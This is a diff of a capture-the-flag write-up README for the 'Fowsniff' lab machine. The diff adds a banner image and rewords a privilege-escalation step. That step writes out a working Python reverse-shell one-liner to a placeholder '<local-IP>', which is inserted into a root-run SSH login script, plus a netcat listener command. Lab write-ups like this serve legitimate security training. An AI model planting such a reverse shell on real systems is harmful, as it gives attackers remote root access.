@@ -1,3 +1,5 @@
+![Fowsniff CTF](https://github.com/user-attachments/assets/bae4f410-02ca-4d47-8599-148b68e4abcd)
+
 # Fowsniff-Capture The Flag 🔱
 
 Welcome to the world of ethical hacking, where curiosity meets challenge and every keystroke brings you closer to uncovering hidden vulnerabilities. In this Capture the Flag (CTF) adventure, nicknamed **"Fowsniff"**, I'll be stepping into the shoes of a cyber sleuth, navigating through layers of digital defenses to expose the secrets of a vulnerable machine. From port scanning and online sleuthing to cracking hashes and brute-forcing logins, this project is more than just a test of technical skills—it's a journey into the heart of cybersecurity. Join me as I unravel the complexities of **Fowsniff**, one flag at a time. 😁
@@ -80,8 +82,10 @@ Access the web server running on port 80 by visiting **htpp://<target_IP>** in t
 
 - Look in the '**/etc/update-motd.d/00-header**' folder and the '**00-header**' file shows that the '**/opt/cube/cube.sh**' file is run when a user connects to the 
   machine using SSH (and will run as root user).
-  - Edit **cube.sh** by inserting a Python reverse shell:
-    - '''**python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'** '''
+  - Since this script is executed as root when an SSH connection is made, we can edit the **cube.sh** file by inserting a Python reverse shell that will trigger 
+    once our user logs in via SSH (make sure to replace you local IP and listener port):
+    - **python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); 
+         os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'** 
   - Set up a Netcat listener on local machine: **nc -nlvp 1234**
   - In a seperate terminal, SSH back into the machine: **ssh <username>@<target_IP>**
   - The reverse shell should connect to your listener.  Access the root directory and read the flag:
